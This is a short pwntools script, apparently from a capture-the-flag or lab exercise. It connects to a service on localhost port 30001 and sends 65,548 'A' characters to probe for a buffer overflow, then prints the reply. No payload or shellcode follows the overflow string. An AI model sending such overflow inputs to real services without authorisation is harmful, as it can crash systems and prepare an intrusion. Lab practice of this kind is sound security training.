from pwn import *

io = remote('localhost', 30001)
#receive ready to input
print(io.recvline())
io.sendline('A'*65548)
#receive return
ret = io.recvline()
print(len(ret))
print(ret)
